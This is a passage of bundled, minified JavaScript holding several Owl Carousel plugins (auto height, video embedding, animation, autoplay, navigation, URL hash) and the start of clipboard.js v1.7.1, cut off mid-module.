                a.each(e, function(b, c) {
                    f.push(a(c).height())
                }),
                    g = Math.max.apply(null, f),
                g <= 1 && d && this._previousHeight && (g = this._previousHeight),
                    this._previousHeight = g,
                    this._core.$stage.parent().height(g).addClass(this._core.settings.autoHeightClass)
            }
            ,
            e.prototype.destroy = function() {
                var a, b;
                for (a in this._handlers)
                    this._core.$element.off(a, this._handlers[a]);
                for (b in Object.getOwnPropertyNames(this))
                    "function" != typeof this[b] && (this[b] = null)
            }
            ,
            a.fn.owlCarousel.Constructor.Plugins.AutoHeight = e
    }(window.Zepto || window.jQuery, window, document),
    function(a, b, c, d) {
        var e = function(b) {
            this._core = b,
                this._videos = {},
                this._playing = null,
                this._handlers = {
                    "initialized.owl.carousel": a.proxy(function(a) {
                        a.namespace && this._core.register({
                            type: "state",
                            name: "playing",
                            tags: ["interacting"]
                        })
                    }, this),
                    "resize.owl.carousel": a.proxy(function(a) {
                        a.namespace && this._core.settings.video && this.isInFullScreen() && a.preventDefault()
                    }, this),
                    "refreshed.owl.carousel": a.proxy(function(a) {
                        a.namespace && this._core.is("resizing") && this._core.$stage.find(".cloned .owl-video-frame").remove()
                    }, this),
                    "changed.owl.carousel": a.proxy(function(a) {
                        a.namespace && "position" === a.property.name && this._playing && this.stop()
                    }, this),
                    "prepared.owl.carousel": a.proxy(function(b) {
                        if (b.namespace) {
                            var c = a(b.content).find(".owl-video");
                            c.length && (c.css("display", "none"),
                                this.fetch(c, a(b.content)))
                        }
                    }, this)
                },
                this._core.options = a.extend({}, e.Defaults, this._core.options),
                this._core.$element.on(this._handlers),
                this._core.$element.on("click.owl.video", ".owl-video-play-icon", a.proxy(function(a) {
                    this.play(a)
                }, this))
        };
        e.Defaults = {
            video: !1,
            videoHeight: !1,
            videoWidth: !1
        },
            e.prototype.fetch = function(a, b) {
                var c = function() {
                    return a.attr("data-vimeo-id") ? "vimeo" : a.attr("data-vzaar-id") ? "vzaar" : "youtube"
                }()
                    , d = a.attr("data-vimeo-id") || a.attr("data-youtube-id") || a.attr("data-vzaar-id")
                    , e = a.attr("data-width") || this._core.settings.videoWidth
                    , f = a.attr("data-height") || this._core.settings.videoHeight
                    , g = a.attr("href");
                if (!g)
                    throw new Error("Missing video URL.");
                if (d = g.match(/(http:|https:|)\/\/(player.|www.|app.)?(vimeo\.com|youtu(be\.com|\.be|be\.googleapis\.com|be\-nocookie\.com)|vzaar\.com)\/(video\/|videos\/|embed\/|channels\/.+\/|groups\/.+\/|watch\?v=|v\/)?([A-Za-z0-9._%-]*)(\&\S+)?/),
                d[3].indexOf("youtu") > -1)
                    c = "youtube";
                else if (d[3].indexOf("vimeo") > -1)
                    c = "vimeo";
                else {
                    if (!(d[3].indexOf("vzaar") > -1))
                        throw new Error("Video URL not supported.");
                    c = "vzaar"
                }
                d = d[6],
                    this._videos[g] = {
                        type: c,
                        id: d,
                        width: e,
                        height: f
                    },
                    b.attr("data-video", g),
                    this.thumbnail(a, this._videos[g])
            }
            ,
            e.prototype.thumbnail = function(b, c) {
                var d, e, f, g = c.width && c.height ? "width:" + c.width + "px;height:" + c.height + "px;" : "", h = b.find("img"), i = "src", j = "", k = this._core.settings, l = function(c) {
                    e = '<div class="owl-video-play-icon"></div>',
                        d = k.lazyLoad ? a("<div/>", {
                            class: "owl-video-tn " + j,
                            srcType: c
                        }) : a("<div/>", {
                            class: "owl-video-tn",
                            style: "opacity:1;background-image:url(" + c + ")"
                        }),
                        b.after(d),
                        b.after(e)
                };
                if (b.wrap(a("<div/>", {
                    class: "owl-video-wrapper",
                    style: g
                })),
                this._core.settings.lazyLoad && (i = "data-src",
                    j = "owl-lazy"),
                    h.length)
                    return l(h.attr(i)),
                        h.remove(),
                        !1;
                "youtube" === c.type ? (f = "//img.youtube.com/vi/" + c.id + "/hqdefault.jpg",
                    l(f)) : "vimeo" === c.type ? a.ajax({
                    type: "GET",
                    url: "//vimeo.com/api/v2/video/" + c.id + ".json",
                    jsonp: "callback",
                    dataType: "jsonp",
                    success: function(a) {
                        f = a[0].thumbnail_large,
                            l(f)
                    }
                }) : "vzaar" === c.type && a.ajax({
                    type: "GET",
                    url: "//vzaar.com/api/videos/" + c.id + ".json",
                    jsonp: "callback",
                    dataType: "jsonp",
                    success: function(a) {
                        f = a.framegrab_url,
                            l(f)
                    }
                })
            }
            ,
            e.prototype.stop = function() {
                this._core.trigger("stop", null, "video"),
                    this._playing.find(".owl-video-frame").remove(),
                    this._playing.removeClass("owl-video-playing"),
                    this._playing = null,
                    this._core.leave("playing"),
                    this._core.trigger("stopped", null, "video")
            }
            ,
            e.prototype.play = function(b) {
                var c, d = a(b.target), e = d.closest("." + this._core.settings.itemClass), f = this._videos[e.attr("data-video")], g = f.width || "100%", h = f.height || this._core.$stage.height();
                this._playing || (this._core.enter("playing"),
                    this._core.trigger("play", null, "video"),
                    e = this._core.items(this._core.relative(e.index())),
                    this._core.reset(e.index()),
                    c = a('<iframe frameborder="0" allowfullscreen mozallowfullscreen webkitAllowFullScreen ></iframe>'),
                    c.attr("height", h),
                    c.attr("width", g),
                    "youtube" === f.type ? c.attr("src", "//www.youtube.com/embed/" + f.id + "?autoplay=1&rel=0&v=" + f.id) : "vimeo" === f.type ? c.attr("src", "//player.vimeo.com/video/" + f.id + "?autoplay=1") : "vzaar" === f.type && c.attr("src", "//view.vzaar.com/" + f.id + "/player?autoplay=true"),
                    a(c).wrap('<div class="owl-video-frame" />').insertAfter(e.find(".owl-video")),
                    this._playing = e.addClass("owl-video-playing"))
            }
            ,
            e.prototype.isInFullScreen = function() {
                var b = c.fullscreenElement || c.mozFullScreenElement || c.webkitFullscreenElement;
                return b && a(b).parent().hasClass("owl-video-frame")
            }
            ,
            e.prototype.destroy = function() {
                var a, b;
                this._core.$element.off("click.owl.video");
                for (a in this._handlers)
                    this._core.$element.off(a, this._handlers[a]);
                for (b in Object.getOwnPropertyNames(this))
                    "function" != typeof this[b] && (this[b] = null)
            }
            ,
            a.fn.owlCarousel.Constructor.Plugins.Video = e
    }(window.Zepto || window.jQuery, window, document),
    function(a, b, c, d) {
        var e = function(b) {
            this.core = b,
                this.core.options = a.extend({}, e.Defaults, this.core.options),
                this.swapping = !0,
                this.previous = d,
                this.next = d,
                this.handlers = {
                    "change.owl.carousel": a.proxy(function(a) {
                        a.namespace && "position" == a.property.name && (this.previous = this.core.current(),
                            this.next = a.property.value)
                    }, this),
                    "drag.owl.carousel dragged.owl.carousel translated.owl.carousel": a.proxy(function(a) {
                        a.namespace && (this.swapping = "translated" == a.type)
                    }, this),
                    "translate.owl.carousel": a.proxy(function(a) {
                        a.namespace && this.swapping && (this.core.options.animateOut || this.core.options.animateIn) && this.swap()
                    }, this)
                },
                this.core.$element.on(this.handlers)
        };
        e.Defaults = {
            animateOut: !1,
            animateIn: !1
        },
            e.prototype.swap = function() {
                if (1 === this.core.settings.items && a.support.animation && a.support.transition) {
                    this.core.speed(0);
                    var b, c = a.proxy(this.clear, this), d = this.core.$stage.children().eq(this.previous), e = this.core.$stage.children().eq(this.next), f = this.core.settings.animateIn, g = this.core.settings.animateOut;
                    this.core.current() !== this.previous && (g && (b = this.core.coordinates(this.previous) - this.core.coordinates(this.next),
                        d.one(a.support.animation.end, c).css({
                            left: b + "px"
                        }).addClass("animated owl-animated-out").addClass(g)),
                    f && e.one(a.support.animation.end, c).addClass("animated owl-animated-in").addClass(f))
                }
            }
            ,
            e.prototype.clear = function(b) {
                a(b.target).css({
                    left: ""
                }).removeClass("animated owl-animated-out owl-animated-in").removeClass(this.core.settings.animateIn).removeClass(this.core.settings.animateOut),
                    this.core.onTransitionEnd()
            }
            ,
            e.prototype.destroy = function() {
                var a, b;
                for (a in this.handlers)
                    this.core.$element.off(a, this.handlers[a]);
                for (b in Object.getOwnPropertyNames(this))
                    "function" != typeof this[b] && (this[b] = null)
            }
            ,
            a.fn.owlCarousel.Constructor.Plugins.Animate = e
    }(window.Zepto || window.jQuery, window, document),
    function(a, b, c, d) {
        var e = function(b) {
            this._core = b,
                this._call = null,
                this._time = 0,
                this._timeout = 0,
                this._paused = !0,
                this._handlers = {
                    "changed.owl.carousel": a.proxy(function(a) {
                        a.namespace && "settings" === a.property.name ? this._core.settings.autoplay ? this.play() : this.stop() : a.namespace && "position" === a.property.name && this._paused && (this._time = 0)
                    }, this),
                    "initialized.owl.carousel": a.proxy(function(a) {
                        a.namespace && this._core.settings.autoplay && this.play()
                    }, this),
                    "play.owl.autoplay": a.proxy(function(a, b, c) {
                        a.namespace && this.play(b, c)
                    }, this),
                    "stop.owl.autoplay": a.proxy(function(a) {
                        a.namespace && this.stop()
                    }, this),
                    "mouseover.owl.autoplay": a.proxy(function() {
                        this._core.settings.autoplayHoverPause && this._core.is("rotating") && this.pause()
                    }, this),
                    "mouseleave.owl.autoplay": a.proxy(function() {
                        this._core.settings.autoplayHoverPause && this._core.is("rotating") && this.play()
                    }, this),
                    "touchstart.owl.core": a.proxy(function() {
                        this._core.settings.autoplayHoverPause && this._core.is("rotating") && this.pause()
                    }, this),
                    "touchend.owl.core": a.proxy(function() {
                        this._core.settings.autoplayHoverPause && this.play()
                    }, this)
                },
                this._core.$element.on(this._handlers),
                this._core.options = a.extend({}, e.Defaults, this._core.options)
        };
        e.Defaults = {
            autoplay: !1,
            autoplayTimeout: 5e3,
            autoplayHoverPause: !1,
            autoplaySpeed: !1
        },
            e.prototype._next = function(d) {
                this._call = b.setTimeout(a.proxy(this._next, this, d), this._timeout * (Math.round(this.read() / this._timeout) + 1) - this.read()),
                this._core.is("interacting") || c.hidden || this._core.next(d || this._core.settings.autoplaySpeed)
            }
            ,
            e.prototype.read = function() {
                return (new Date).getTime() - this._time
            }
            ,
            e.prototype.play = function(c, d) {
                var e;
                this._core.is("rotating") || this._core.enter("rotating"),
                    c = c || this._core.settings.autoplayTimeout,
                    e = Math.min(this._time % (this._timeout || c), c),
                    this._paused ? (this._time = this.read(),
                        this._paused = !1) : b.clearTimeout(this._call),
                    this._time += this.read() % c - e,
                    this._timeout = c,
                    this._call = b.setTimeout(a.proxy(this._next, this, d), c - e)
            }
            ,
            e.prototype.stop = function() {
                this._core.is("rotating") && (this._time = 0,
                    this._paused = !0,
                    b.clearTimeout(this._call),
                    this._core.leave("rotating"))
            }
            ,
            e.prototype.pause = function() {
                this._core.is("rotating") && !this._paused && (this._time = this.read(),
                    this._paused = !0,
                    b.clearTimeout(this._call))
            }
            ,
            e.prototype.destroy = function() {
                var a, b;
                this.stop();
                for (a in this._handlers)
                    this._core.$element.off(a, this._handlers[a]);
                for (b in Object.getOwnPropertyNames(this))
                    "function" != typeof this[b] && (this[b] = null)
            }
            ,
            a.fn.owlCarousel.Constructor.Plugins.autoplay = e
    }(window.Zepto || window.jQuery, window, document),
    function(a, b, c, d) {
        "use strict";
        var e = function(b) {
            this._core = b,
                this._initialized = !1,
                this._pages = [],
                this._controls = {},
                this._templates = [],
                this.$element = this._core.$element,
                this._overrides = {
                    next: this._core.next,
                    prev: this._core.prev,
                    to: this._core.to
                },
                this._handlers = {
                    "prepared.owl.carousel": a.proxy(function(b) {
                        b.namespace && this._core.settings.dotsData && this._templates.push('<div class="' + this._core.settings.dotClass + '">' + a(b.content).find("[data-dot]").addBack("[data-dot]").attr("data-dot") + "</div>")
                    }, this),
                    "added.owl.carousel": a.proxy(function(a) {
                        a.namespace && this._core.settings.dotsData && this._templates.splice(a.position, 0, this._templates.pop())
                    }, this),
                    "remove.owl.carousel": a.proxy(function(a) {
                        a.namespace && this._core.settings.dotsData && this._templates.splice(a.position, 1)
                    }, this),
                    "changed.owl.carousel": a.proxy(function(a) {
                        a.namespace && "position" == a.property.name && this.draw()
                    }, this),
                    "initialized.owl.carousel": a.proxy(function(a) {
                        a.namespace && !this._initialized && (this._core.trigger("initialize", null, "navigation"),
                            this.initialize(),
                            this.update(),
                            this.draw(),
                            this._initialized = !0,
                            this._core.trigger("initialized", null, "navigation"))
                    }, this),
                    "refreshed.owl.carousel": a.proxy(function(a) {
                        a.namespace && this._initialized && (this._core.trigger("refresh", null, "navigation"),
                            this.update(),
                            this.draw(),
                            this._core.trigger("refreshed", null, "navigation"))
                    }, this)
                },
                this._core.options = a.extend({}, e.Defaults, this._core.options),
                this.$element.on(this._handlers)
        };
        e.Defaults = {
            nav: !1,
            navText: ['<span aria-label="Previous">&#x2039;</span>', '<span aria-label="Next">&#x203a;</span>'],
            navSpeed: !1,
            navElement: 'button type="button" role="presentation"',
            navContainer: !1,
            navContainerClass: "owl-nav",
            navClass: ["owl-prev", "owl-next"],
            slideBy: 1,
            dotClass: "owl-dot",
            dotsClass: "owl-dots",
            dots: !0,
            dotsEach: !1,
            dotsData: !1,
            dotsSpeed: !1,
            dotsContainer: !1
        },
            e.prototype.initialize = function() {
                var b, c = this._core.settings;
                this._controls.$relative = (c.navContainer ? a(c.navContainer) : a("<div>").addClass(c.navContainerClass).appendTo(this.$element)).addClass("disabled"),
                    this._controls.$previous = a("<" + c.navElement + ">").addClass(c.navClass[0]).html(c.navText[0]).prependTo(this._controls.$relative).on("click", a.proxy(function(a) {
                        this.prev(c.navSpeed)
                    }, this)),
                    this._controls.$next = a("<" + c.navElement + ">").addClass(c.navClass[1]).html(c.navText[1]).appendTo(this._controls.$relative).on("click", a.proxy(function(a) {
                        this.next(c.navSpeed)
                    }, this)),
                c.dotsData || (this._templates = [a('<button role="button">').addClass(c.dotClass).append(a("<span>")).prop("outerHTML")]),
                    this._controls.$absolute = (c.dotsContainer ? a(c.dotsContainer) : a("<div>").addClass(c.dotsClass).appendTo(this.$element)).addClass("disabled"),
                    this._controls.$absolute.on("click", "button", a.proxy(function(b) {
                        var d = a(b.target).parent().is(this._controls.$absolute) ? a(b.target).index() : a(b.target).parent().index();
                        b.preventDefault(),
                            this.to(d, c.dotsSpeed)
                    }, this));
                for (b in this._overrides)
                    this._core[b] = a.proxy(this[b], this)
            }
            ,
            e.prototype.destroy = function() {
                var a, b, c, d, e;
                e = this._core.settings;
                for (a in this._handlers)
                    this.$element.off(a, this._handlers[a]);
                for (b in this._controls)
                    "$relative" === b && e.navContainer ? this._controls[b].html("") : this._controls[b].remove();
                for (d in this.overides)
                    this._core[d] = this._overrides[d];
                for (c in Object.getOwnPropertyNames(this))
                    "function" != typeof this[c] && (this[c] = null)
            }
            ,
            e.prototype.update = function() {
                var a, b, c, d = this._core.clones().length / 2, e = d + this._core.items().length, f = this._core.maximum(!0), g = this._core.settings, h = g.center || g.autoWidth || g.dotsData ? 1 : g.dotsEach || g.items;
                if ("page" !== g.slideBy && (g.slideBy = Math.min(g.slideBy, g.items)),
                g.dots || "page" == g.slideBy)
                    for (this._pages = [],
                             a = d,
                             b = 0,
                             c = 0; a < e; a++) {
                        if (b >= h || 0 === b) {
                            if (this._pages.push({
                                start: Math.min(f, a - d),
                                end: a - d + h - 1
                            }),
                            Math.min(f, a - d) === f)
                                break;
                            b = 0,
                                ++c
                        }
                        b += this._core.mergers(this._core.relative(a))
                    }
            }
            ,
            e.prototype.draw = function() {
                var b, c = this._core.settings, d = this._core.items().length <= c.items, e = this._core.relative(this._core.current()), f = c.loop || c.rewind;
                this._controls.$relative.toggleClass("disabled", !c.nav || d),
                c.nav && (this._controls.$previous.toggleClass("disabled", !f && e <= this._core.minimum(!0)),
                    this._controls.$next.toggleClass("disabled", !f && e >= this._core.maximum(!0))),
                    this._controls.$absolute.toggleClass("disabled", !c.dots || d),
                c.dots && (b = this._pages.length - this._controls.$absolute.children().length,
                    c.dotsData && 0 !== b ? this._controls.$absolute.html(this._templates.join("")) : b > 0 ? this._controls.$absolute.append(new Array(b + 1).join(this._templates[0])) : b < 0 && this._controls.$absolute.children().slice(b).remove(),
                    this._controls.$absolute.find(".active").removeClass("active"),
                    this._controls.$absolute.children().eq(a.inArray(this.current(), this._pages)).addClass("active"))
            }
            ,
            e.prototype.onTrigger = function(b) {
                var c = this._core.settings;
                b.page = {
                    index: a.inArray(this.current(), this._pages),
                    count: this._pages.length,
                    size: c && (c.center || c.autoWidth || c.dotsData ? 1 : c.dotsEach || c.items)
                }
            }
            ,
            e.prototype.current = function() {
                var b = this._core.relative(this._core.current());
                return a.grep(this._pages, a.proxy(function(a, c) {
                    return a.start <= b && a.end >= b
                }, this)).pop()
            }
            ,
            e.prototype.getPosition = function(b) {
                var c, d, e = this._core.settings;
                return "page" == e.slideBy ? (c = a.inArray(this.current(), this._pages),
                    d = this._pages.length,
                    b ? ++c : --c,
                    c = this._pages[(c % d + d) % d].start) : (c = this._core.relative(this._core.current()),
                    d = this._core.items().length,
                    b ? c += e.slideBy : c -= e.slideBy),
                    c
            }
            ,
            e.prototype.next = function(b) {
                a.proxy(this._overrides.to, this._core)(this.getPosition(!0), b)
            }
            ,
            e.prototype.prev = function(b) {
                a.proxy(this._overrides.to, this._core)(this.getPosition(!1), b)
            }
            ,
            e.prototype.to = function(b, c, d) {
                var e;
                !d && this._pages.length ? (e = this._pages.length,
                    a.proxy(this._overrides.to, this._core)(this._pages[(b % e + e) % e].start, c)) : a.proxy(this._overrides.to, this._core)(b, c)
            }
            ,
            a.fn.owlCarousel.Constructor.Plugins.Navigation = e
    }(window.Zepto || window.jQuery, window, document),
    function(a, b, c, d) {
        "use strict";
        var e = function(c) {
            this._core = c,
                this._hashes = {},
                this.$element = this._core.$element,
                this._handlers = {
                    "initialized.owl.carousel": a.proxy(function(c) {
                        c.namespace && "URLHash" === this._core.settings.startPosition && a(b).trigger("hashchange.owl.navigation")
                    }, this),
                    "prepared.owl.carousel": a.proxy(function(b) {
                        if (b.namespace) {
                            var c = a(b.content).find("[data-hash]").addBack("[data-hash]").attr("data-hash");
                            if (!c)
                                return;
                            this._hashes[c] = b.content
                        }
                    }, this),
                    "changed.owl.carousel": a.proxy(function(c) {
                        if (c.namespace && "position" === c.property.name) {
                            var d = this._core.items(this._core.relative(this._core.current()))
                                , e = a.map(this._hashes, function(a, b) {
                                return a === d ? b : null
                            }).join();
                            if (!e || b.location.hash.slice(1) === e)
                                return;
                            b.location.hash = e
                        }
                    }, this)
                },
                this._core.options = a.extend({}, e.Defaults, this._core.options),
                this.$element.on(this._handlers),
                a(b).on("hashchange.owl.navigation", a.proxy(function(a) {
                    var c = b.location.hash.substring(1)
                        , e = this._core.$stage.children()
                        , f = this._hashes[c] && e.index(this._hashes[c]);
                    f !== d && f !== this._core.current() && this._core.to(this._core.relative(f), !1, !0)
                }, this))
        };
        e.Defaults = {
            URLhashListener: !1
        },
            e.prototype.destroy = function() {
                var c, d;
                a(b).off("hashchange.owl.navigation");
                for (c in this._handlers)
                    this._core.$element.off(c, this._handlers[c]);
                for (d in Object.getOwnPropertyNames(this))
                    "function" != typeof this[d] && (this[d] = null)
            }
            ,
            a.fn.owlCarousel.Constructor.Plugins.Hash = e
    }(window.Zepto || window.jQuery, window, document),
    function(a, b, c, d) {
        function e(b, c) {
            var e = !1
                , f = b.charAt(0).toUpperCase() + b.slice(1);
            return a.each((b + " " + h.join(f + " ") + f).split(" "), function(a, b) {
                if (g[b] !== d)
                    return e = !c || b,
                        !1
            }),
                e
        }
        function f(a) {
            return e(a, !0)
        }
        var g = a("<support>").get(0).style
            , h = "Webkit Moz O ms".split(" ")
            , i = {
            transition: {
                end: {
                    WebkitTransition: "webkitTransitionEnd",
                    MozTransition: "transitionend",
                    OTransition: "oTransitionEnd",
                    transition: "transitionend"
                }
            },
            animation: {
                end: {
                    WebkitAnimation: "webkitAnimationEnd",
                    MozAnimation: "animationend",
                    OAnimation: "oAnimationEnd",
                    animation: "animationend"
                }
            }
        }
            , j = {
            csstransforms: function() {
                return !!e("transform")
            },
            csstransforms3d: function() {
                return !!e("perspective")
            },
            csstransitions: function() {
                return !!e("transition")
            },
            cssanimations: function() {
                return !!e("animation")
            }
        };
        j.csstransitions() && (a.support.transition = new String(f("transition")),
            a.support.transition.end = i.transition.end[a.support.transition]),
        j.cssanimations() && (a.support.animation = new String(f("animation")),
            a.support.animation.end = i.animation.end[a.support.animation]),
        j.csstransforms() && (a.support.transform = new String(f("transform")),
            a.support.transform3d = j.csstransforms3d())
    }(window.Zepto || window.jQuery, window, document);
/*!
 * clipboard.js v1.7.1
 */
!function(t) {
    if ("object" == typeof exports && "undefined" != typeof module)
        module.exports = t();
    else if ("function" == typeof define && define.amd)
        define([], t);
    else {
        var e;
        e = "undefined" != typeof window ? window : "undefined" != typeof global ? global : "undefined" != typeof self ? self : this,
            e.Clipboard = t()
    }
}(function() {
    var t, e, n;
    return function t(e, n, o) {
        function i(a, c) {
            if (!n[a]) {
                if (!e[a]) {
                    var l = "function" == typeof require && require;
                    if (!c && l)
                        return l(a, !0);
                    if (r)
                        return r(a, !0);
                    var s = new Error("Cannot find module '" + a + "'");
                    throw s.code = "MODULE_NOT_FOUND",
                        s
                }
                var u = n[a] = {
                    exports: {}
                };
                e[a][0].call(u.exports, function(t) {
                    var n = e[a][1][t];
                    return i(n || t)
                }, u, u.exports, t, e, n, o)
            }
            return n[a].exports
        }
        for (var r = "function" == typeof require && require, a = 0; a < o.length; a++)
            i(o[a]);
        return i
    }({
        1: [function(t, e, n) {
            function o(t, e) {
                for (; t && t.nodeType !== i; ) {
                    if ("function" == typeof t.matches && t.matches(e))
                        return t;
                    t = t.parentNode
                }
            }
            var i = 9;
            if ("undefined" != typeof Element && !Element.prototype.matches) {
                var r = Element.prototype;
                r.matches = r.matchesSelector || r.mozMatchesSelector || r.msMatchesSelector || r.oMatchesSelector || r.webkitMatchesSelector
            }
            e.exports = o
        }
            , {}],
        2: [function(t, e, n) {
            function o(t, e, n, o, r) {
                var a = i.apply(this, arguments);
                return t.addEventListener(n, a, r),
                    {
                        destroy: function() {
                            t.removeEventListener(n, a, r)
                        }
                    }
            }
            function i(t, e, n, o) {
                return function(n) {
                    n.delegateTarget = r(n.target, e),
                    n.delegateTarget && o.call(t, n)
                }
            }
            var r = t("./closest");
            e.exports = o
        }
            , {
                "./closest": 1
            }],
        3: [function(t, e, n) {
            n.node = function(t) {
                return void 0 !== t && t instanceof HTMLElement && 1 === t.nodeType
            }
                ,
                n.nodeList = function(t) {
                    var e = Object.prototype.toString.call(t);
                    return void 0 !== t && ("[object NodeList]" === e || "[object HTMLCollection]" === e) && "length"in t && (0 === t.length || n.node(t[0]))
                }
                ,
                n.string = function(t) {
                    return "string" == typeof t || t instanceof String
                }
                ,
                n.fn = function(t) {
                    return "[object Function]" === Object.prototype.toString.call(t)
                }
        }
            , {}],
        4: [function(t, e, n) {
            function o(t, e, n) {
                if (!t && !e && !n)
                    throw new Error("Missing required arguments");
                if (!c.string(e))
                    throw new TypeError("Second argument must be a String");
                if (!c.fn(n))
                    throw new TypeError("Third argument must be a Function");
                if (c.node(t))
                    return i(t, e, n);
                if (c.nodeList(t))
                    return r(t, e, n);
                if (c.string(t))
                    return a(t, e, n);
                throw new TypeError("First argument must be a String, HTMLElement, HTMLCollection, or NodeList")
            }
            function i(t, e, n) {
                return t.addEventListener(e, n),
                    {
                        destroy: function() {
                            t.removeEventListener(e, n)
                        }
                    }
            }
            function r(t, e, n) {
                return Array.prototype.forEach.call(t, function(t) {
                    t.addEventListener(e, n)
                }),
                    {
                        destroy: function() {
                            Array.prototype.forEach.call(t, function(t) {
                                t.removeEventListener(e, n)
                            })
                        }
                    }
            }
            function a(t, e, n) {
                return l(document.body, t, e, n)
            }
            var c = t("./is")
                , l = t("delegate");
            e.exports = o
        }
            , {
                "./is": 3,
                delegate: 2
            }],
        5: [function(t, e, n) {
            function o(t) {
                var e;
                if ("SELECT" === t.nodeName)
                    t.focus(),
                        e = t.value;
                else if ("INPUT" === t.nodeName || "TEXTAREA" === t.nodeName) {
                    var n = t.hasAttribute("readonly");
                    n || t.setAttribute("readonly", ""),
                        t.select(),
                        t.setSelectionRange(0, t.value.length),
                    n || t.removeAttribute("readonly"),
                        e = t.value
                } else {
                    t.hasAttribute("contenteditable") && t.focus();
                    var o = window.getSelection()
                        , i = document.createRange();
                    i.selectNodeContents(t),
                        o.removeAllRanges(),
                        o.addRange(i),
                        e = o.toString()
                }
                return e
            }
            e.exports = o
        }
            , {}],
        6: [function(t, e, n) {
            function o() {}
            o.prototype = {
                on: function(t, e, n) {
                    var o = this.e || (this.e = {});
                    return (o[t] || (o[t] = [])).push({
                        fn: e,
                        ctx: n
                    }),
                        this
                },
                once: function(t, e, n) {
                    function o() {
                        i.off(t, o),
                            e.apply(n, arguments)
                    }
                    var i = this;
                    return o._ = e,
                        this.on(t, o, n)
                },
                emit: function(t) {
                    var e = [].slice.call(arguments, 1)
                        , n = ((this.e || (this.e = {}))[t] || []).slice()
                        , o = 0
                        , i = n.length;
                    for (o; o < i; o++)
                        n[o].fn.apply(n[o].ctx, e);
                    return this
                },
                off: function(t, e) {
                    var n = this.e || (this.e = {})
                        , o = n[t]
                        , i = [];
                    if (o && e)
                        for (var r = 0, a = o.length; r < a; r++)
                            o[r].fn !== e && o[r].fn._ !== e && i.push(o[r]);
                    return i.length ? n[t] = i : delete n[t],
                        this
                }
            },
                e.exports = o
        }
            , {}],
        7: [function(e, n, o) {
            !function(i, r) {
                if ("function" == typeof t && t.amd)
                    t(["module", "select"], r);
                else if (void 0 !== o)
                    r(n, e("select"));
                else {
                    var a = {
                        exports: {}
                    };
                    r(a, i.select),
                        i.clipboardAction = a.exports
                }
            }(this, function(t, e) {
                "use strict";
                function n(t) {
                    return t && t.__esModule ? t : {
                        default: t
                    }
                }
                function o(t, e) {
                    if (!(t instanceof e))
                        throw new TypeError("Cannot call a class as a function")
                }
                var i = n(e)
                    , r = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(t) {
                        return typeof t
                    }
                    : function(t) {
                        return t && "function" == typeof Symbol && t.constructor === Symbol && t !== Symbol.prototype ? "symbol" : typeof t
                    }
                    , a = function() {
                    function t(t, e) {
                        for (var n = 0; n < e.length; n++) {
                            var o = e[n];
                            o.enumerable = o.enumerable || !1,
                                o.configurable = !0,
                            "value"in o && (o.writable = !0),
                                Object.defineProperty(t, o.key, o)
                        }
                    }
                    return function(e, n, o) {
                        return n && t(e.prototype, n),
                        o && t(e, o),
                            e
                    }
                }()
                    , c = function() {
                    function t(e) {
                        o(this, t),
                            this.resolveOptions(e),
                            this.initSelection()
                    }
                    return a(t, [{
                        key: "resolveOptions",
                        value: function t() {
                            var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
                            this.action = e.action,
                                this.container = e.container,
                                this.emitter = e.emitter,
                                this.target = e.target,
                                this.text = e.text,
                                this.trigger = e.trigger,
                                this.selectedText = ""
                        }
                    }, {
                        key: "initSelection",
                        value: function t() {
                            this.text ? this.selectFake() : this.target && this.selectTarget()
                        }
                    }, {
                        key: "selectFake",
                        value: function t() {
                            var e = this
                                , n = "rtl" == document.documentElement.getAttribute("dir");
                            this.removeFake(),
                                this.fakeHandlerCallback = function() {
                                    return e.removeFake()
                                }
                                ,
                                this.fakeHandler = this.container.addEventListener("click", this.fakeHandlerCallback) || !0,
                                this.fakeElem = document.createElement("textarea"),
                                this.fakeElem.style.fontSize = "12pt",
                                this.fakeElem.style.border = "0",
                                this.fakeElem.style.padding = "0",
                                this.fakeElem.style.margin = "0",
                                this.fakeElem.style.position = "absolute",
                                this.fakeElem.style[n ? "right" : "left"] = "-9999px";
                            var o = window.pageYOffset || document.documentElement.scrollTop;
                            this.fakeElem.style.top = o + "px",
                                this.fakeElem.setAttribute("readonly", ""),
                                this.fakeElem.value = this.text,
                                this.container.appendChild(this.fakeElem),
                                this.selectedText = (0,
                                    i.default)(this.fakeElem),
                                this.copyText()
                        }
                    }, {
                        key: "removeFake",
                        value: function t() {
                            this.fakeHandler && (this.container.removeEventListener("click", this.fakeHandlerCallback),
                                this.fakeHandler = null,
                                this.fakeHandlerCallback = null),
                            this.fakeElem && (this.container.removeChild(this.fakeElem),
                                this.fakeElem = null)
                        }
                    }, {
                        key: "selectTarget",
                        value: function t() {
                            this.selectedText = (0,
                                i.default)(this.target),
                                this.copyText()
                        }
                    }, {
                        key: "copyText",
                        value: function t() {
                            var e = void 0;
                            try {
                                e = document.execCommand(this.action)
                            } catch (t) {
                                e = !1
                            }
                            this.handleResult(e)
                        }
                    }, {
                        key: "handleResult",
                        value: function t(e) {
                            this.emitter.emit(e ? "success" : "error", {
                                action: this.action,
                                text: this.selectedText,
                                trigger: this.trigger,
                                clearSelection: this.clearSelection.bind(this)
                            })
                        }
                    }, {
                        key: "clearSelection",
                        value: function t() {
                            this.trigger && this.trigger.focus(),
                                window.getSelection().removeAllRanges()
                        }
                    }, {
                        key: "destroy",
                        value: function t() {
                            this.removeFake()
                        }
                    }, {
                        key: "action",
                        set: function t() {
                            var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "copy";
                            if (this._action = e,
                            "copy" !== this._action && "cut" !== this._action)
                                throw new Error('Invalid "action" value, use either "copy" or "cut"')
                        },
                        get: function t() {
                            return this._action
                        }
                    }, {
                        key: "target",
                        set: function t(e) {
                            if (void 0 !== e) {
                                if (!e || "object" !== (void 0 === e ? "undefined" : r(e)) || 1 !== e.nodeType)
                                    throw new Error('Invalid "target" value, use a valid Element');
                                if ("copy" === this.action && e.hasAttribute("disabled"))
                                    throw new Error('Invalid "target" attribute. Please use "readonly" instead of "disabled" attribute');
                                if ("cut" === this.action && (e.hasAttribute("readonly") || e.hasAttribute("disabled")))
                                    throw new Error('Invalid "target" attribute. You can\'t cut text from elements with "readonly" or "disabled" attributes');
                                this._target = e
                            }
                        },
                        get: function t() {
                            return this._target
                        }
                    }]),
                        t
                }();
                t.exports = c
            })
        }
            , {
                select: 5
            }],
        8: [function(e, n, o) {
            !function(i, r) {
                if ("function" == typeof t && t.amd)
